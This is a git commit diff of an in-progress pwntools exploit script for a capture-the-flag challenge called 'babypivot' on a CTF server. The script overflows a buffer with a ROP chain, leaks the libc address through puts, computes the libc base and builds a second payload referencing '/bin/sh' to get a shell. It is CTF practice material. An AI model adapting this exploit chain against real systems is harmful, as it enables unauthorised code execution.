69b91074b43dfc8b6e91a48f614ffc9999b26196
Cosimo Michelagnoli <michelagnolicosimo@gmail.com>
2022-05-25 10:12:11 -0400

    feat: working on pwn

--- pwn/babypivot/babyPivot_script.py
+++ pwn/babypivot/babyPivot_script.py
@@ -1,7 +1,9 @@
 from pwn import *
 #import pdb
 exe = context.binary = ELF('welcome')
-libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+#libc = ELF('/lib/i386-linux-gnu/libc.so.6')    	
+libc = ELF('libc6_2.27-3ubuntu1.4_i386.so')    	
 
 remotehost = ('ctf.fibonhack.it', 16003)
 
@@ -20,59 +22,86 @@ def start(argv=[], *a, **kw):
         return process([exe.path] + argv, *a, **kw)
         
 context.log_level = 'debug'
-io = start(env={"SPORCASTACK":"A"*123}) #env={"SPORCASTACK":"A"*123}
-ui.pause()
+#ui.pause()
 
 addr = exe.sym
 addr_got = exe.got
 addr_plt = exe.plt
 ret_addr = 0x080490af
-
-
-io.recvline()
-io.recvline()
-
-##### Generation of unique sequences ####
-g = cyclic_gen()
-#log.info(f"offset return address: {g.find(b'gaaa')}")
-
-#buff  =   b'A'*60 + p32(addr_plt.puts) + p32(addr_got.puts) + p32(addr.main)+ b'A'*100 p32(addr_got.__libc_start_main) 
-buff = flat({
-    24: p32(exe.plt.puts) + p32(exe.sym.main),
-    32: p32(addr_got.__libc_start_main),
-    #40: p32(exe.plt.puts),
-    #48: p32(addr_got.__isoc99_scanf),
-    110: b'A'
-})
-
-io.sendline(buff)
-
-libc_start_address = io.recvline().strip(b'\n')
+leave_ret_addr = 0x080490f5
+pop_ebp_addr = 0x0804926b
 
 
 
-libc_start_address = list(map(hex, unpack_many(libc_start_address, 32, endian='little', sign=False)))[0]
-log.info(f"libc_address leakato: {libc_start_address}")
 
 
-io.recvline()
-io.recvline()
+while(True):
+	io = start() #env={"SPORCASTACK":"A"*123}
 
-buff1 = flat({
-    24: p32(exe.plt.puts) * 4,
-    #32: p32(addr_got.__isoc99_scanf) + p32(exe.sym.main) + p32(exe.sym.main),
-    110: b'A'
-})
+	io.recvline()
+	io.recvline()
 
-io.sendline(buff1)
-
-libc_scanf_address = io.recvline().strip(b'\n')
-
-libc_start_address = list(map(hex, unpack_many(libc_scanf_address, 32, endian='little', sign=False)))[0]
-log.info(f"scanf_address leakato: {libc_scanf_address}")
-
-#io.sendline() 
+	##### Generation of unique sequences ####
+	g = cyclic_gen()
+	#log.info(f"offset return address: {g.find(b'gaaa')}")
+	'''
+	### 	Buffer per exploitare libc 	###
+	buff = flat({
+	    24: p32(exe.plt.puts) + p32(pop_ebp_addr),
+	    32: p32(addr_got.__libc_start_main),
+	    36: p32(exe.plt.puts) + p32(pop_ebp_addr),
+	    44: p32(addr_got.__isoc99_scanf),
+	    110: b'A'
+	})
+	'''
+	try:
+		buff = flat({
+		    24: p32(exe.plt.puts) + p32(pop_ebp_addr),
+		    32: p32(addr_got.__libc_start_main),
+		    36: p32(exe.sym.main),
+		    110: b'A'
+		})
+		io.sendline(buff)
+		
+		libc_start_address = io.recvline().strip(b'\n')
+		libc_start_address = u32(libc_start_address[:4])
+		log.info(f"libc_start_address leakato: {libc_start_address}")
+		libc.address = 0
+		libc.address = libc_start_address - libc.sym.__libc_start_main 
+		
+		log.info(f"libc_address calcolato: {libc.address}")
+		io.recvline()
+		io.recvline()
+		
+		buff = flat({
+		    24: p32(libc.sym.puts) + p32(exe.sym.main),
+		    32: p32(next(libc.search(b'/bin/sh'))),
+		    110: b'A'
+		})
+		
+		
+		io.sendline(buff)
 
 	
 
+		'''
+		libc_start_address = io.recvline().strip(b'\n')
+
+		__isoc99_scanf = io.recvline().strip(b'\n')
+
+		libc_start_address = list(map(hex, unpack_many(libc_start_address, 32, endian='little', sign=False)))[0]
+		log.info(f"libc_start_address leakato: {libc_start_address}")
+
+		__isoc99_scanf = list(map(hex, unpack_many(__isoc99_scanf, 32, endian='little', sign=False)))[0]
+		log.info(f"__isoc99_scanf leakato: {__isoc99_scanf}")
+		'''
+		#io.sendline(b'pwd')
+		io.recvline()
+		
+		break
+	except EOFError:
+		io.close()
+	
+
 io.interactive()
+
